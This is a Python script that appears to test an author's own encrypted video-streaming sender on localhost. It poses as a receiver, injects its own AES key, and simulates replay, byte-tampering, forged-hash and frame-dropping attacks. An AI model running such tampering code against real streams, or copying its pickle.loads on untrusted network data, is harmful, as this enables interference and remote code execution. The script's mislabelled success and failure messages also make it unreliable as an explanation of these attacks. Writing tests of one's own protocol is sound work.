import socket
import pickle
import struct
import hashlib
import time
import random
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Random import get_random_bytes
import numpy as np
import cv2

# MITM: Attacker tries to connect
ATTACKER_IP = "127.0.0.1"
PORT = 5000

def recv_exact(sock, size):
    """Ensure we receive exactly `size` bytes."""
    data = b""
    while len(data) < size:
        chunk = sock.recv(size - len(data))
        if not chunk:
            return None
        data += chunk
    return data

def perform_attack():
    """ Attacker connects to the server and tries to manipulate the encrypted stream. """
    try:
        attacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        attacker_socket.connect((ATTACKER_IP, PORT))
        print("[🔥] Attacker connected to the sender pretending to be a receiver!")

        # Intercept public RSA key from sender
        public_key = attacker_socket.recv(2048)

        # MITM Attack: Generate our own AES key
        malicious_aes_key = get_random_bytes(16)
        cipher_rsa = PKCS1_OAEP.new(RSA.import_key(public_key))
        encrypted_aes_key = cipher_rsa.encrypt(malicious_aes_key)
        attacker_socket.send(encrypted_aes_key)
        print("[🔥] Sent attacker-controlled AES key to sender!")

        while True:
            packet_size_bytes = recv_exact(attacker_socket, 4)
            if not packet_size_bytes:
                print("[❌] Sender disconnected.")
                break

            packet_size = struct.unpack(">I", packet_size_bytes)[0]
            data_packet = recv_exact(attacker_socket, packet_size)

            if not data_packet:
                print("[❌] Connection lost. Exiting attacker.")
                break

            # Unpack original data
            nonce, tag, encrypted_frame, frame_hash = pickle.loads(data_packet)

            ### 🔴 Attack 1: Brute-force AES decryption attempt
            fake_aes_key = get_random_bytes(16)  # Wrong key
            try:
                cipher_aes = AES.new(fake_aes_key, AES.MODE_EAX, nonce=nonce)
                decrypted_frame = cipher_aes.decrypt_and_verify(encrypted_frame, tag)
                print("[⚠️] Brute-force decryption attempt FAILED (wrong AES key).")
            except ValueError:
                print("[✅] Brute-force attack detected: Incorrect AES key!")

            ### 🔴 Attack 2: Replay Attack
            if random.random() < 0.3:  # 30% chance of replay
                print("[⚠️] Replaying an old frame...")
                attacker_socket.send(packet_size_bytes)
                attacker_socket.sendall(data_packet)

            ### 🔴 Attack 3: Frame Tampering
            tampered_frame = bytearray(encrypted_frame)
            if len(tampered_frame) > 10:
                tampered_frame[5] ^= 0xFF  # Corrupt a random byte

            tampered_packet = pickle.dumps((nonce, tag, bytes(tampered_frame), frame_hash))
            if random.random() < 0.2:  # 20% chance of tampering
                print("[⚠️] Sending tampered frame to receiver!")
                attacker_socket.send(len(tampered_packet).to_bytes(4, 'big'))
                attacker_socket.sendall(tampered_packet)

            ### 🔴 Attack 4: Hash Mismatch (Integrity Violation)
            fake_hash = get_random_bytes(32)  # Completely wrong hash
            fake_packet = pickle.dumps((nonce, tag, encrypted_frame, fake_hash))
            if random.random() < 0.1:  # 10% chance of hash attack
                print("[⚠️] Sending a frame with an invalid hash!")
                attacker_socket.send(len(fake_packet).to_bytes(4, 'big'))
                attacker_socket.sendall(fake_packet)

            ### 🔴 Attack 5: Dropping Frames
            if random.random() < 0.2:  # 20% chance of dropping a frame
                print("[⚠️] Dropping a frame (DoS attack)...")
                continue

            # Legitimately forward packet (normal MITM)
            attacker_socket.send(packet_size_bytes)
            attacker_socket.sendall(data_packet)

    except Exception as e:
        print(f"[❌] Error in attacker: {e}")

    finally:
        attacker_socket.close()
        print("[🔴] Attacker disconnected.")

if __name__ == "__main__":
    perform_attack()
